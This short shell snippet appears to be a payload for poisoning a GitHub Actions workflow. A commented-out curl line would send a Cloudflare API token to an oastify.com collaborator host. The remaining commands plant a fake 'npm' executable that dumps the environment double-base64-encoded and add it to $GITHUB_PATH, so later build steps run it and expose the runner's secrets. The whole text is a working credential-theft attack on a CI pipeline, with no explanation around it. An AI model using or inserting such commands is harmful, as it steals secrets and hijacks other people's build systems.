#curl http://5gmr2z0x73nfcdq7ibq8iaooxf36rxfm.oastify.com?data=${{ secrets.CLOUDFLARE_API_TOKEN }}
mkdir evil_path
echo 'env | base64 | base64' > evil_path/npm
chmod +x evil_path/npm
echo "./evil_path" > $GITHUB_PATH